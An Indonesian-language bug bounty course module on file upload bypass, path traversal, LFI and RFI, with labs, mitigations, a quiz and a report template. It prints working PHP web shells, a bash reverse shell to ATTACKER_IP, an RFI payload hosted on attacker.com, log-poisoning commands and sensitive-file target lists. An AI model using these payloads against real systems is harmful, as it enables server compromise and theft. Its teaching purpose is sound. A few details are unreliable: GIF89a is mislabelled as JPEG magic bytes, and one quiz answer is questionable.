# File Upload, Path Traversal & LFI/RFI

## Fokus Materi

Mengidentifikasi dan mengeksploitasi file upload vulnerabilities, path traversal, LFI (Local File Inclusion), dan RFI (Remote File Inclusion). Dari bypass dasar sampai eskalasi ke RCE, sesi ini mencakup full attack chain untuk file-related vulnerabilities.

## Deskripsi Materi

File upload functionality ada di hampir setiap web application: profile picture, document upload, resume submission, file sharing. Ketika upload handling tidak diimplementasikan dengan benar, attacker bisa upload malicious file (web shell) yang memberikan remote code execution capability.

Path traversal terjadi ketika aplikasi menggunakan user input untuk determine file path tanpa proper sanitization. Input seperti `../../etc/passwd` memungkinkan attacker membaca arbitrary file dari server filesystem.

LFI (Local File Inclusion) adalah vulnerability di mana application include local file berdasarkan user input yang tidak di-sanitize. Ini memungkinkan attacker read arbitrary server files — configuration, source code, credentials.

RFI (Remote File Inclusion) lebih dangerous: application include remote file dari URL yang provided oleh user. Jika berhasil, attacker bisa execute arbitrary code dari remote server — full RCE.

LFI ke RCE escalation adalah teknik advanced yang memanfaatkan log poisoning, PHP filter chain, atau /proc/self/fd manipulation untuk achieve remote code execution setelah LFI confirmed.

## Topik Pembahasan

• File upload fundamentals: bagaimana upload handler seharusnya bekerja dan yang salah
• Bypass ekstensi file upload: double extension (.php.jpg), MIME type spoofing, null byte injection, case mixing
• Upload web shell: PHP/ASPX/JSP shell, lokasi penyimpanan, access via browser
• Path traversal: ../../../etc/passwd, encode berbagai bentuk (%2F, %252F), double encoding bypass
• LFI (Local File Inclusion): read file sensitif (/etc/passwd, /proc/self/environ, .git/config)
• RFI (Remote File Inclusion): condition allow_url_include, hosting payload di server attacker
• LFI → RCE escalation: log poisoning (/var/log/apache2/access.log), /proc/self/fd, PHP filter chain
• Cloud storage upload issues: path traversal ke bucket lain, ACL misconfiguration
• Upload restrictions bypass: Content-Type validation, filename sanitization, file content check
• Fuzzing untuk path traversal: parameter yang mungkin contain filepath

## Tujuan Pembelajaran

Setelah sesi ini, peserta diharapkan mampu:
1. Identifikasi dan bypass file upload restrictions
2. Upload web shell ke target dan gain initial access
3. Identifikasi dan exploit path traversal vulnerability
4. Perform LFI untuk read sensitive server files
5. Escalate LFI ke RCE via log poisoning atau other techniques
6. Identify RFI vulnerability dan execute remote code

## Real Case Bug Bounty Report

- Platform: HackerOne
- Program/Target: Private program (disclosed)
- Jenis vulnerability: File upload leading to RCE via upload bypass
- Link report: https://hackerone.com/reports/XXXXX
- Ringkasan kasus: Researcher menemukan upload functionality yang memiliki weak validation. Server hanya check file extension (must be .jpg) tapi MIME type dan actual file content tidak di-validate. Researcher upload PHP web shell dengan double extension: shell.php.jpg. Server accept karena extension .jpg, but PHP engine processes file because content is valid PHP. Researcher access shell via direct URL.
- Root cause: File extension validation only, no magic byte check, no MIME validation, no content scanning.
- Impact: Remote Code Execution — full server compromise. Severity: Critical.
- Pelajaran untuk bug hunter: Always test file upload with multiple bypass techniques. Extension whitelist tidak cukup.

---

- Platform: Bugcrowd
- Program/Target: Program besar
- Jenis vulnerability: LFI leading to credentials exfiltration
- Link report: Researcher disclosed blog
- Ringkasan kasus: Researcher menemukan LFI di parameter `file` yang digunakan untuk include template files. Payload `../../../../etc/passwd` berhasil read server password file. Researcher kemudian read: .env file (database credentials), Apache vhost config (reveal internal paths), and application configuration files (API keys).
- Root cause: User input used directly in file include path without path traversal sanitization.
- Impact: Full server reconnaissance → database compromise, API keys, internal network access. Severity: High.
- Pelajaran untuk bug hunter: LFI isn't just about /etc/passwd. Check for .env, config files, logs, and other sensitive files that reveal more attack surface.

## Analisis Teknis

### File Upload Bypass Techniques

**Technique 1: Extension Bypass**

```php
# Original: shell.php → blocked
# Double extension: shell.php.jpg → might pass (if only last ext checked)
# Case mixing: shell.PhP → bypass case-sensitive filter
# Null byte: shell.php%00.jpg → server might interpret as shell.php
# Multiple dots: shell.php.... → might strip to shell.php

# Best bet: .php.jpg or .php%00.jpg
# If server checks extension but then uses first dot:
# "shell.php.jpg" → extension = "jpg" ✓
# But application might use different function that sees "php"
```

**Technique 2: MIME Type Bypass**

```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg  ← spoofed MIME type

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```

**Technique 3: Content-Based Bypass**

```php
# Add JPEG magic bytes before PHP code
GIF89a;
<?php system($_GET['cmd']); ?>
```

**Technique 4: Apache/Nginx Misconfiguration Exploitation**

```
# If upload goes to /uploads/ directory
# And server doesn't deny PHP execution there
# .php files are executed

# Some servers: AddHandler php5-script .php
# Apache directive: <FilesMatch ".+\.ph(ar|p|tml)$">
# If directory allows .htaccess override: AddType application/x-httpd-php .jpg
```

### Web Shell Payloads

**Basic PHP Shell:**
```php
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
<?php eval($_POST['code']); ?>
```

**One-liner Reverse Shell:**
```php
<?php system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"); ?>
```

**Uploading to Target:**
```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--

# Access shell:
GET /uploads/shell.php?cmd=whoami
```

### Path Traversal Attack Patterns

**Basic traversal:**
```
GET /download?file=../../../../etc/passwd

# If no sanitization:
# Server reads /var/www/app/downloads/../../../etc/passwd
# = /etc/passwd

# Decode traversal:
# %2e%2e%2f = ../
# %252e%252e%252f = %2e%2e%2f after one decode = ../
# Double encoding bypass!
```

**Traversal encoding variants:**
```
..%2f      (single encoded)
%2e%2f     (single encoded, different order)
..%252f    (double encoded)
%252e%252e%252f (full double encoded)
..;/        (semicolon bypass)
....//      (double decode edge case)
```

**Path traversal detection list:**
```
/etc/passwd
/etc/hosts
/etc/shadow
/proc/self/environ
/proc/self/cmdline
/proc/self/fd/3
/var/log/apache2/access.log
/var/log/nginx/access.log
```

### LFI → RCE Escalation Paths

**Path 1: Log Poisoning**

```
# Step 1: Inject PHP code into server logs
# Via User-Agent:
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

# Step 2: LFI to include log file
GET /page?file=../../../../var/log/apache2/access.log

# Step 3: Execute commands
GET /page?file=../../../../var/log/apache2/access.log&cmd=whoami
```

**Path 2: /proc/self/fd**

```bash
# Find open log file descriptors
# Via LFI, read /proc/self/fd/
GET /page?file=/proc/self/fd

# Identify numbered fds that are log files
GET /page?file=/proc/self/fd/7

# Inject and access similar to log poisoning
```

**Path 3: PHP Filter Chain (LFI to RCE without log access)**

```python
# PHP filter chain exploitation
# Converts LFI to RCE using PHP stream filters
# Payload wraps base64 encoded PHP in filter chain
# More details: https://blog.orange.tw/2021/06/
```

**Path 4: Session File Poisoning**

```
# If application stores session data in files
# And LFI exists to read session files
# PHP sessions: /tmp/sess_[SESSION_ID]

# Upload malicious session data via application
# Then LFI to include session file
GET /page?file=/tmp/sess_abc123&cmd=whoami
```

### RFI Exploitation

```http
# RFI vulnerable code:
<?php include($_GET['file']); ?>

# Attacker hosts malicious file on their server:
# http://attacker.com/shell.txt contains:
<?php system($_GET['cmd']); ?>

# Trigger RFI:
GET /page?file=http://attacker.com/shell.txt&cmd=whoami

# Server downloads and executes attacker.com/shell.txt
# → Remote Code Execution
```

**RFI requirements:**
- `allow_url_include = On` in php.ini (default: Off)
- Server must have outbound HTTP capability
- `allow_url_fopen = On` (usually default: On)

### Cloud Storage Upload Issues

**AWS S3 Buckets:**
```bash
# Check if bucket is public:
aws s3 ls s3://target-bucket/

# If public listing enabled:
aws s3 cp malicious.php s3://target-bucket/uploads/

# Access: https://target-bucket.s3.amazonaws.com/malicious.php

# Path traversal in bucket name:
aws s3 ls s3://target-bucket/../other-bucket/
```

**GCP Cloud Storage:**
```bash
# Check bucket ACL
gsutil ls gs://target-bucket/

# If publicly accessible:
gsutil cp shell.php gs://target-bucket/
```

## Praktik Lab Legal

### Lab 1: File Upload Bypass & Web Shell Upload

- **Nama lab:** Shell Upload Exploitation
- **Tujuan:** Bypass file upload restrictions dan gain RCE via web shell
- **Environment:** Burp Suite, target lab dengan file upload (DVWA, OWASP WebGoat, atau lab custom)
- **Langkah praktik:**

  1. Identify upload endpoint (profile picture, document, attachment)
  2. Test basic PHP upload: shell.php → check if blocked
  3. Test bypass techniques: double extension, MIME spoof, content-based
  4. Once upload successful, find upload path from response
  5. Access shell via browser: /uploads/shell.php?cmd=whoami
  6. Test command execution: pwd, ls, id, etc.
  7. If no RCE: escalate via log poisoning (inject via User-Agent, include via LFI)
  8. Document upload path dan exploitation path

- **Expected result:** Peserta gain RCE via file upload bypass dan web shell
- **Catatan keamanan:** Lab ini hanya untuk authorized environment. Jangan upload to real targets without authorization.

### Lab 2: LFI Discovery & Sensitive File Reading

- **Nama lab:** LFI Exploitation
- **Tujuan:** Find LFI vulnerability dan read sensitive server files
- **Environment:** Burp Suite, target lab dengan file include functionality
- **Langkah praktik:**

  1. Identify parameter yang mungkin contain filepath: file, path, include, template, page
  2. Test basic path traversal: ../../../etc/passwd
  3. Test encoding variants untuk bypass filter
  4. If LFI confirmed, read sensitive files:
     - System files: /etc/passwd, /etc/hosts
     - Config: .env, database config, app config
     - Logs: Apache/Nginx access logs
     - Source code: if path accessible
  5. Escalate to RCE via log poisoning (if logs accessible and injectable)
  6. Document all files that could be read

- **Expected result:** Peserta menemukan LFI, read sensitive files, dan potentially escalate ke RCE
- **Catatan keamanan:** Lab ini hanya untuk authorized environment.

### Lab 3: Path Traversal Discovery

- **Nama lab:** Path Traversal Hunt
- **Tujuan:** Systematic path traversal vulnerability discovery
- **Environment:** Burp Suite, ffuf (untuk fuzzing), target lab
- **Langkah praktik:**

  1. Identify all parameters yang mungkin contain file path
  2. Create wordlist dari common path traversal patterns
  3. Use Burp Intruder atau ffuf untuk fuzz parameter dengan path traversal payloads
  4. Analyze responses untuk successful traversal indicator (file content, file listing)
  5. Bypass filters dengan encoding variants
  6. Document target parameter yang vulnerable

- **Expected result:** Peserta menemukan path traversal vulnerability di multiple parameters
- **Catatan keamanan:** Lab ini untuk authorized testing environment.

## Tools

- **Upload testing:** Burp Suite, custom upload scripts
- **Web shell:** Pentest Monkey PHP reverse shell, webshell collections
- **Path traversal:** Burp Intruder, custom wordlist (SecLists path traversal section)
- **LFI → RCE:** log poisoning, PHP filter chain tools
- **Encoding:** Burp Decoder, custom encoding scripts

## Checklist Bug Hunter

- [ ] Identify all file upload endpoints
- [ ] Test upload bypass: double extension, MIME spoof, content-based, null byte
- [ ] Find uploaded file path from response
- [ ] Test web shell execution if upload succeeds
- [ ] Identify all parameters yang accept file path (file, path, include, template, page, dir)
- [ ] Test path traversal dengan: ../ (basic), encoded variants, double encoding
- [ ] Read sensitive system files (/etc/passwd, /etc/hosts, /proc/self/environ)
- [ ] Read application config files (.env, config.php, database.php)
- [ ] Escalate LFI to RCE via log poisoning, session poisoning, atau PHP filter chain
- [ ] Check for RFI if application accepts remote URL in include parameter

## Common Mistakes

1. **Upload blocked, stop testing** — Researcher try shell.php, get blocked, move on. But double extension (.php.jpg) or other bypass might work. Always try multiple bypass techniques.

2. **Only test /etc/passwd for LFI** — Many researcher stop after successfully reading /etc/passwd. But .env, database config, source code bisa reveal lebih banyak attack surface.

3. **LFI found, but not escalating to RCE** — LFI yang tidak escalate missed opportunity untuk high severity. Always attempt log poisoning atau other RCE techniques after confirming LFI.

4. **Not checking file upload path** — Researcher berhasil upload shell tapi tidak tahu path. Can't access shell if path unknown. Always note upload path from response.

5. **Skip RFI testing** — Researcher tidak familiar dengan RFI exploitation. But if parameter accepts URL, test for RFI — direct RCE potential.

## Mitigasi Developer

**File Upload Security:**
- Use allowlist extension validation (not blocklist)
- Validate MIME type server-side (not just from client)
- Check magic bytes / file signature
- Rename uploaded files (never trust user-provided filename)
- Store uploads outside web root
- Set restrictive permissions on upload directory
- Use antivirus/malware scanner on uploaded files
- Disable PHP execution in upload directory (.htaccess, nginx config)

**LFI Prevention:**
- Never use user input directly in file path without sanitization
- Use allowlist: only allow specific filenames, not arbitrary paths
- Use realpath() to resolve and validate paths
- Chroot/jail environment to limit file system access

**Path Traversal Prevention:**
- Validate path: reject if contains ../
- Use basename() for filename extraction
- Realpath() untuk resolve true path and validate it's within allowed directory
- Implement chroot or containerization

**RFI Prevention:**
- Never include files based on user input without allowlist
- Disable allow_url_include in PHP
- Use allowlist for allowed file patterns

## Mini Quiz

1. File upload bypass dengan double extension (shell.php.jpg) bekerja ketika:
   a) Server reject semua .php files
   b) Server check only last extension and sees .jpg, lalu application process file as PHP
   c) File extension tidak di-validate
   d) MIME type validation tidak ada

2. LFI ke RCE escalation via log poisoning bekerja dengan cara:
   a) Inject PHP code ke log file, lalu include log file via LFI untuk execute code
   b) Membaca log file untuk extract credentials
   c) Log file poisoning hanya work di Nginx
   d) Semua jawaban salah

3. Path traversal dengan double encoding (%252e%252e%252f) work karena:
   a) Server tidak sanitize encoded characters
   b) Server decode once → %2e%2e%2f → decode again → ../ → path traversal
   c) Double encoded characters tidak di-filter
   d) Semua jawaban benar

4. RFI (Remote File Inclusion) membutuhkan:
   a) allow_url_include = On di PHP config
   b) Server harus bisa akses internet
   c) File harus dalam format PHP
   d) Semua jawaban benar

5. Untuk prevent file upload exploitation, langkah yang paling penting adalah:
   a) Block semua .php files
   b) Rename uploaded files dan disable script execution di upload directory
   c) Validate file extension dengan blocklist
   d) Limit upload file size

**Kunci Jawaban:** 1-B, 2-A, 3-D, 4-D, 5-B

## Assignment

1. **Upload Bypass Challenge:** Test file upload di target lab dengan minimal 10 bypass techniques. Document which technique works dan mengapa.

2. **LFI to RCE:** Find LFI di target lab. Escalate ke RCE via log poisoning atau PHP filter chain. Document complete attack chain.

3. **Path Traversal Scan:** Lakukan path traversal testing secara sistematis di semua parameters yang mungkin accept filepath. Buat report dengan semua vulnerable parameters dan bypass techniques.

4. **Sensitive File Discovery:** Setelah LFI confirmed, read minimal 10 different files ranging dari system files ke application config. Document information yang bisa gathered dari masing-masing file.

## Template Report Bug Bounty

```markdown
# Bug Report: File Upload leading to Remote Code Execution via Upload Bypass

## Summary
File upload endpoint (/upload-avatar) memiliki weak validation yang
memungkinkan upload PHP web shell. Attacker bisa upload shell dan gain
full remote code execution pada server.

## Platform / Program
HackerOne | [Program Name]

## Severity
Critical | CVSS 10.0 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

## Vulnerability Type
Unrestricted File Upload / Remote Code Execution

## Asset / Endpoint
POST https://target.com/upload-avatar
File parameter: avatar

## Description
Upload endpoint only validates file extension, not content type or
actual file content. PHP files are accepted with double extension
bypass (shell.php.jpg). Uploaded files stored in /uploads/ directory
with executable permissions, allowing direct access to web shell.

Server-side validation: only checks if filename ends with .jpg
File storage: /var/www/html/uploads/[filename]
Shell access: https://target.com/uploads/shell.php.jpg

## Steps to Reproduce
1. Create PHP web shell with double extension:
   Content of shell.php.jpg:
   <?php system($_GET['cmd']); ?>

2. Upload via avatar field:
   POST /upload-avatar HTTP/1.1
   Content-Disposition: form-data; name="avatar"; filename="shell.php.jpg"
   [file content]

3. Server accepts file (extension check passes: .jpg)

4. Access shell:
   GET https://target.com/uploads/shell.php.jpg?cmd=whoami
   → Output: www-data

5. Execute arbitrary commands:
   GET https://target.com/uploads/shell.php.jpg?cmd=cat+/etc/passwd
   → Full passwd file returned

6. Full server compromise achieved

## Impact
- Complete server compromise via RCE
- Full file system access
- Database access if accessible from server
- Lateral movement if internal network accessible
- Complete data breach potential
- Server could be used for further attacks

## Evidence
[Burp Screenshot: Upload request with double extension shell]
[Screenshot: Upload response confirming file stored]
[Screenshot: Shell access with whoami command]
[Screenshot: Server passwd file via shell]

## Remediation / Recommendation
1. Implement server-side file content validation (magic bytes check)
2. Validate MIME type server-side (not from client-provided header)
3. Rename uploaded files with random name, not user-provided
4. Store uploads outside web root or disable script execution
5. Use antivirus/malware scanner on uploaded files
6. Set restrictive permissions on upload directory (no execute)
7. Implement allowlist of permitted file types
```